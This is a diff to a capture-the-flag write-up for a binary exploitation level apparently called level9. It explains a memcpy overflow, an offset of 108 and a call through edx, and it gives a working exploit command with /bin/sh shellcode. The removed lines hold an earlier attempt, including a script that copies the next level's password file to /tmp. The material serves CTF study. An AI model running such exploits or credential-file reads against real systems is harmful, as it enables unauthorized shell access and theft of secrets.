@@ -1,4 +1,13 @@
-./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "OSEF" + "\x58\x7c\xea\xb7" + "DDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAA" + "\x0c\xa0\x04\x08" + "`/tmp/abouvero_le_nullos`IIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY" + "\x5e\x86\x04\x08")')
+This program takes 1 argument and memcpys it to a variable in <setAnnotation>
+Let's try to overflow it !!!
 
-#!/bin/sh
-cat /home/user/bonus0/.pass > /tmp/toto2
+With a big string, the program crashes while trying to access data pointed by $eax. $eax was overwritten by our big string, and we found an offset of 108.
+Shortly after accessing the data pointed by $eax, this data is moved to $edx then $edx is called. We can inject something.
+
+<SetAnnotation> returns the pointer to the buffer : 0x0804a00c. We can inject some shellcode a the start of the string, to make $edx call our shellcode.
+We also need to make the 4 first bytes a pointer to the shellcode since "call $edx" takes a pointer to execute something.
+
+	pointer to shellcode :  0x0804a00c + 4 |     shellcode  						| offset - len(shellcode - len(pointer)) | address of the buffer
+
+./level9 `python -c 'print("\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08")'`
+
